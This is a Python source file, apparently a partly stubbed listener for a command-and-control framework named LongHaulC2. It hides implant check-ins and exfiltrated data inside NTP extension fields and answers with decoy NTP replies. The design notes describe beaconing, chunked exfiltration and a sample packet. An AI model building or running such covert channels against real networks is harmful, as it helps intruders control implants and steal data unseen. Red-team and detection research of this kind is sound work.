"""
LongHaulC2 NTP Listener

Current idea:

Data comes in via ntp extension fields.

This will be chunked data, if data is bigger than X size.

The response ID total paylaod size, as well as a chunk number will be in the extension headers to support this.

The buffer will be in redis (details to come). When buffer == total size of payload, then
the response will be processed & stored as a response.

Beacon rule: One packet per checkin. (1 get == 1 post)
Maybe later add an option for sending lots back at once, but for now keep it to this/low and slow.

chunk size & sleep should give enough flexibility for various setups.

User settings:
- chunk size/max packet size: How much data to chunk/send. base_packet + needed fields + chunk size.

Redis implementation:
---
Copy RedisImplantTaskService, but call it "RedisImplantBufferService" or something.

All this does is store chunks of responses until it's fully there, then the key is nuked.
Should be flexible for other listeners that want to do chunking as well, and keeps the logic out of the main listener
code.

Extension Fields:
----

Extension Field layout. This comes after the 48 byte NTP packet
-----------------------------------------------
| Bytes | Description                          |
|-------|--------------------------------------|
| 0-1   | Extension Field Type (2 bytes)       |
| 2-3   | Extension Field Length (2 bytes)     |
| 4-7   | Session ID (4 bytes), makes sure uniqueness when talking to server
| 8-?   | Data of extension fields             |
-----------------------------------------------

Remeber: The NTP packet is just a vessel. It has no idea about specific implementations. All
the data is stored in the extension fields.


Each NTP packet should have:
1. UUID extension field: Identifies the implant checking in.
2. Data extension field: contains the data.

Final:
---

Standard NTP Packet Layout (48 bytes total)
---------------------------------------------------------------------------------
| Bytes | Description                                                           |
|-------|-----------------------------------------------------------------------|
| 0     | LI (Leap Indicator, 2 bits), Version (3 bits), Mode (3 bits)          |
| 1     | Stratum (1 byte), indicates the distance from the primary clock       |
| 2     | Poll Interval (1 byte), maximum interval between messages             |
| 3     | Precision (1 byte), precision of the local clock                      |
| 4-7   | Root Delay (4 bytes), total roundtrip delay to the primary reference  |
| 8-11  | Root Dispersion (4 bytes), maximum error relative to the primary      |
| 12-15 | Reference ID (4 bytes), identifies the particular reference clock     |
| 16-23 | Reference Timestamp (8 bytes), time the clock was last set/corrected  |
| 24-31 | Origin Timestamp (8 bytes), time request departed the client          |
| 32-39 | Receive Timestamp (8 bytes), time request arrived at the server       |
| 40-47 | Transmit Timestamp (8 bytes), time reply departed the server          |
---------------------------------------------------------------------------------

Pcket:

```
23 02 09 EC 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

# Extension 1:
00 01 00 18 DE AD BE EF 55 0E 84 00 E2 9B 41 D4
A7 16 44 66 55 44 00 00

> Field: 00 01
> Length: 00 18 (24 bytes of data)
> Session ID: DE AD BE EF
> Data: 55 0E 84 00 E2 9B 41 D4 A7 16 44 66 55 44 00 00 (UUID)

#extension 2:
00 02 00 10 DE AD BE EF
48 45 4C 4C 4F 00 00 00

> Field: 00 02
> Length: 00 10 (16 bytes of data)
> Session ID: DE AD BE EF (same session ID as before, so we know it's part of the same message)
> Data: 48 45 4C 4C 4F 00 00 00 (the message "HELLO" in ASCII, padded to 16 bytes)


Packets needed:

GET packet:
- UUID Field with implant UUID

POST packet:
- UUID Field with implant UUID
- Data Field with data to exfiltrate (chunked if needed, with chunk number and total chunks in the extension header)

```

"""

import socket
import tomllib
from concurrent.futures import ThreadPoolExecutor

import structlog

from .protocol import NtpPacket

# Abstracted core logic and transforms

listener_logger = structlog.get_logger("listener")

# Global state
#! Globals not ideal, but are a simple way to share state without having to do a class.
g_profile: dict = {}
g_listener_uuid: str = ""


def process_udp_packet(server_socket, raw_data, client_address):
    """Parses the packet and sends a response back to the client."""
    listener_logger.info(
        "Processing client data", raw_data=raw_data.hex(), client_ip=client_address[0], client_port=client_address[1]
    )
    try:
        # handle incoming packet... (seperate func/logic)
        extensions_dict = NtpPacket.parse_extensions(raw_data)

        # placeholder values for extensions (TBD)
        # get from net profile
        required_fields = [0x00, 0x01, 0x02]

        # make sure all chunking fields are there.
        if not all(field in extensions_dict for field in required_fields):
            listener_logger.warning(
                "Missing expected extension fields, dropping packet",
                missing_fields=[field for field in required_fields if field not in extensions_dict],
            )
            return

        # check chunk number and total chunks in extensions, and store in redis
        chunk_number = ...  # noqa
        # max_chunks = ... # could calculate this with max total packet size?
        payload_size = ...  # noqa
        payload_data = ...  # noqa

        # if chunk_number == max_chunks: # we know we have the full payload in redis, so we can process it
        # get all data from redis, push to inbox, and delete buffer.

        # if chunk_number == 1: new chunk response, so create key in redis (or let it auto handle that?)

        # give a response to client that looks somewhat legit
        # placeholder response packet
        response_packet_object = NtpPacket.from_buffer_copy(raw_data)
        for field_name in response_packet_object._fields_:
            listener_logger.info(
                "Processing field", field_name=field_name[0], field_value=getattr(response_packet_object, field_name[0])
            )

        #! cast to bytes to get the raw packet back, which is what sendto() needs. This is a bit of a hack, but it works
        response_packet_bytes = bytes(response_packet_object)
        # Send directly back to the client address using the main server socket
        server_socket.sendto(response_packet_bytes, client_address)

    except Exception as e:
        #! FYI - NTP behavior is to drop bad packets, aka ghost the client.
        # AFAIK this isn't stated anywhere (except for specific cases), but kind of implied:
        # https://datatracker.ietf.org/doc/html/rfc5905
        listener_logger.error("Error processing packet, dropping", error=str(e))


def start_udp_server(host: str, port: int):  # Port 123 is standard NTP
    # AF_INET = IPv4, SOCK_DGRAM = UDP
    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server.bind((host, port))
    listener_logger.info("UDP Server listening", host=host, port=port, uuid=g_listener_uuid)

    with ThreadPoolExecutor(max_workers=20) as executor:
        """
        Using TPE for better performance under load, but could also just spawn threads directly.
        The main point is to not do any processing in the main loop, which needs to get back to recvfrom()
        as fast as possible to avoid dropping packets on a busy network.
        """

        try:
            while True:
                # Blocks until ANY packet arrives on this port
                raw_data, client_address = server.recvfrom(1024)  # adjustable.
                # max size can be up to 65535, but if we do chunking, and set that chunking in the network profile,
                # then we need to expect *that* packet size. For POC, it's fine at 1024.

                # For high throughput, immediately hand off to a thread so the
                executor.submit(process_udp_packet, server, raw_data, client_address)

        except KeyboardInterrupt:
            listener_logger.info("Shutting down server.")
        finally:
            server.close()


def run(listener_uuid: str, listener_port: int, listener_host: str, listener_profile_contents: str):
    global g_profile, g_listener_uuid
    g_listener_uuid = listener_uuid

    # Load the TOML profile securely into memory for the duration of the listener's lifecycle
    try:
        g_profile = tomllib.loads(listener_profile_contents)
    except Exception as e:
        listener_logger.error("Failed to parse TOML profile on listener boot", error=str(e))
        raise

    listener_logger.info("Starting listener with parsed TOML profile")
    start_udp_server(host=listener_host, port=listener_port)
